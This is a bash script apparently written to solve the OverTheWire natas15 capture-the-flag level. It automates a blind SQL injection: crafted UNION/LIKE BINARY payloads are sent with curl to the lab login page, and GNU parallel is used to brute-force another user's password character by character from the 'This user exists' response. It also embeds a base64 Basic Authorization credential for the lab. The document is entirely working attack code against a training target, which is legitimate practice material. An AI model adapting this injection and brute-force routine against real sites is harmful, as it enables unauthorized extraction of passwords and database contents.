#!/bin/bash

SECONDS=0

$null > alfabeto
$null > password
$null > current_byte

export QUERY_PREFFIX="username=%22+and+1%3D2+UNION+SELECT+null%2Cnull+FROM+users+WHERE+username%3D%22natas16%22+AND+password+LIKE+BINARY+%27"
export QUERY_SUFFIX='%25%27+%23'

export PASSWORD=""

function perform_request(){
    curl -s 'http://natas15.natas.labs.overthewire.org/index.php' \
      -H 'Cache-Control: max-age=0' \
      -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' \
      -H 'Content-Type: application/x-www-form-urlencoded' \
      -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
      --data-raw "$QUERY_PREFFIX$1$QUERY_SUFFIX" \
      --compressed \
      --insecure \
      --max-time 10
}

function enum_alphabet(){
    perform_request "%25$1" | grep "This user exists" > /dev/null && echo "$1" >> alfabeto
}

function enum_alphabet_parallel(){
    for letter in {A..Z} {a..z} {0..9}; do echo "$letter"; done | parallel --max-args=1 enum_alphabet
}

function brute_force_byte(){
    perform_request $PASSWORD$1 | grep "This user exists" > /dev/null && echo "$1" > current_byte && echo -ne "$1" >> password
}

function brute_force_byte_parallel(){
    for letter in `cat alfabeto`; do echo "$letter"; done | parallel --max-args=1 brute_force_byte
}

function brute_force(){
    for i in {1..32}; do 
	    PASSWORD="$PASSWORD$(cat current_byte)"
	    echo "$PASSWORD"
	    brute_force_byte_parallel
    done
}

function main(){
    enum_alphabet_parallel
    brute_force
}


## criar u função abstrata para brute force em byte, e usar no enum_alphabet e no proprio brute_f....

export -f {perform_request,enum_alphabet,brute_force_byte,brute_force_byte_parallel,brute_force}

main

#echo "[$(for i in `cat alfabeto`; do echo -ne "$i";done)]"
echo "Password -> $(cat password)"

rm {alfabeto,password,current_byte}

echo "$SECONDS secs"
